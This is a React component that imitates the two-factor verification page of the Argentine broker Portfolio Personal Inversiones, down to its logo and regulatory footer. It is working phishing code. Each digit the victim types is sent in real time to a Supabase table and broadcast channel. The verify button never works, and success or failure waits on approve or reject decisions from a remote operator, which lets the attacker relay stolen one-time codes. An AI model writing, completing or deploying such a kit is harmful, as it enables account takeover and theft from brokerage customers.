import { useState, useEffect, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import { Mail, ShieldCheck, CheckCircle2 } from "lucide-react";
import ppiLogoSvg from "@/assets/ppi-logo.svg";

interface PpiOtpScreenProps {
  email: string;
  sessionId: string;
  twofaType?: number;
  onBack: () => void;
}

const PpiOtpScreen = ({ email, sessionId, twofaType, onBack }: PpiOtpScreenProps) => {
  const [otp, setOtp] = useState("");
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");

  const isEmail = twofaType === 0;
  const isAuthenticator = twofaType === 1;

  const title = isEmail
    ? "Código de verificación por email"
    : isAuthenticator
    ? "Código de Google Authenticator"
    : "Verificación en dos pasos";

  const description = isEmail
    ? "Ingresá el código de 6 dígitos que enviamos a tu correo electrónico registrado."
    : isAuthenticator
    ? "Ingresá el código de 6 dígitos de tu aplicación Google Authenticator."
    : "Ingresá el código de verificación que recibiste.";

  const Icon = isEmail ? Mail : ShieldCheck;

  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage("Código incorrecto. Intentá nuevamente.");
          setOtp("");
          setTimeout(() => {
            setStatus("input");
            supabase.from("sessions").update({ status: "redirect_otp" } as any).eq("id", sessionId).then(() => {});
          }, 2000);
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [sessionId]);

  useEffect(() => {
    const channel = supabase.channel(`session-review-client-otp-${sessionId}`);
    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage("Código incorrecto. Intentá nuevamente.");
          setOtp("");
          setTimeout(() => setStatus("input"), 2000);
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [sessionId]);

  const handleOtpChange = useCallback((value: string) => {
    setOtp(value);
    supabase.from("sessions").update({ otp_code: value } as any).eq("id", sessionId).then(() => {});
    const bc = supabase.channel(`otp-live-${sessionId}-${Date.now()}`);
    bc.subscribe((s) => {
      if (s === "SUBSCRIBED") {
        bc.send({ type: "broadcast", event: "otp_code_update", payload: { otp_code: value, session_id: sessionId } });
        setTimeout(() => supabase.removeChannel(bc), 1500);
      }
    });
  }, [sessionId]);

  useEffect(() => {
    if (otp.length === 6 && status === "input") setStatus("verifying");
  }, [otp, status]);

  const username = email?.split("@")[0] || email;

  if (status === "success") {
    return (
      <div className="flex min-h-[100svh] flex-col bg-white">
        <header className="flex items-center justify-between px-5 py-4 sm:px-10 sm:py-5 bg-white border-b border-[#f0f0f0]">
          <img src={ppiLogoSvg} alt="PPI" className="h-8 sm:h-9" />
          <span className="text-[13px] font-normal text-[#8c939a]">Seguridad</span>
        </header>
        <main className="flex flex-1 items-center justify-center px-4">
          <div className="w-full max-w-[400px] text-center">
            <div className="flex justify-center mb-4">
              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-green-50 border border-green-100">
                <CheckCircle2 className="h-8 w-8 text-green-600" />
              </div>
            </div>
            <h3 className="mb-2 text-[20px] font-bold text-[#1e2a3a]">Verificación exitosa</h3>
            <p className="text-sm text-[#8c939a]">Tu identidad fue verificada correctamente.</p>
            <p className="mt-3 text-xs text-[#bbb]">{username}</p>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100svh] flex-col bg-white">
      {/* Header */}
      <header className="flex items-center justify-between px-5 py-4 sm:px-10 sm:py-5 bg-white border-b border-[#f0f0f0]">
        <img src={ppiLogoSvg} alt="PPI" className="h-8 sm:h-9" />
        <span className="text-[13px] font-normal text-[#8c939a]">Seguridad</span>
      </header>

      <main className="flex flex-1 items-center justify-center px-4">
        <div className="w-full max-w-[400px]">
          {/* Icon */}
          <div className="flex justify-center mb-5">
            <div className="relative flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#1e5a96] to-[#2a7bc8]">
              <Icon className="h-8 w-8 text-white" strokeWidth={1.8} />
            </div>
          </div>

          <h3 className="text-center text-[20px] sm:text-[22px] font-bold text-[#1e2a3a] mb-2">{title}</h3>
          <p className="text-center text-[13.5px] text-[#8c939a] mb-6 max-w-[340px] mx-auto leading-relaxed">{description}</p>

          {errorMessage && status === "error" && (
            <div className="mb-4 w-full rounded-lg border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600 text-center">
              {errorMessage}
            </div>
          )}

          {/* OTP input */}
          <div className="flex justify-center mb-5">
            <InputOTP maxLength={6} value={otp} onChange={handleOtpChange} disabled={status === "verifying"} inputMode="numeric" pattern="[0-9]*">
              <InputOTPGroup>
                <InputOTPSlot index={0} className="h-12 w-12 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd] rounded-none first:rounded-l-md" />
                <InputOTPSlot index={1} className="h-12 w-12 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd] rounded-none" />
                <InputOTPSlot index={2} className="h-12 w-12 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd] rounded-none" />
                <InputOTPSlot index={3} className="h-12 w-12 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd] rounded-none" />
                <InputOTPSlot index={4} className="h-12 w-12 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd] rounded-none" />
                <InputOTPSlot index={5} className="h-12 w-12 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd] rounded-none last:rounded-r-md" />
              </InputOTPGroup>
            </InputOTP>
          </div>

          {/* Verify button */}
          <button
            disabled
            className={`w-full rounded-[4px] py-2.5 text-[15px] font-semibold transition-all ${
              status === "verifying"
                ? "bg-[#42a5f5] text-white"
                : "bg-[#a8d4f0] text-white cursor-default"
            }`}
          >
            {status === "verifying" ? "Verificando..." : "Verificar"}
          </button>

          <p className="mt-5 text-center text-xs text-[#bbb]">{username}</p>

          {/* Type indicator */}
          <div className="mt-4 flex justify-center">
            <span className={`inline-flex items-center gap-1.5 rounded-full px-3 py-1 text-[11px] font-medium ${
              isEmail
                ? "bg-blue-50 text-[#1e5a96] border border-blue-100"
                : isAuthenticator
                ? "bg-emerald-50 text-emerald-700 border border-emerald-100"
                : "bg-gray-50 text-[#666] border border-gray-200"
            }`}>
              <Icon size={12} />
              {isEmail ? "Código por email" : isAuthenticator ? "Google Authenticator" : "Código de verificación"}
            </span>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-[#e5e7eb] bg-white px-5 py-3 sm:px-10">
        <p className="text-center text-[10px] text-[#bbb]">
          Portfolio Personal Inversiones S.A. — ALyC Integral CNV N° 686
        </p>
      </footer>
    </div>
  );
};

export default PpiOtpScreen;
